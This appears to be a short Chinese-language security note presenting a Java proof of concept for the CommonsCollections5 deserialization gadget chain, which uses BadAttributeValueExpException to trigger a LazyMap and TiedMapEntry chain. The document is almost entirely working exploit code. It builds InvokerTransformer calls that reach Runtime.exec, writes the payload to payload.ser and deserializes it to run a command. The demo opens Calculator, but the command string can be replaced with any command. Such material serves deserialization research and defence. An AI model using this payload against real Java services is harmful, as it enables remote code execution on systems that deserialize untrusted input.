---
description: BadAttributeValueExpException替代AnnotationInvocationHandler
---

# CommonsCollections5

PayLoad:

```java
public static void main(String[] args) throws Exception {
        String command = "open /Applications/Calculator.app/";
        final String[] execArgs = new String[] { command };
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        //创建factory为恶意ChainedTransformer对象的lazyMap类实例
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        //创建map为恶意lazyMap，key为foo的TiedMapEntry类实例
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        //将BadAttributeValueExpException对象的成员变量val赋值为恶意entry
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Permit.setAccessible(valfield);
        valfield.set(val, entry);
        setFieldValue(transformerChain, "iTransformers", transformers);
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(val);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
```



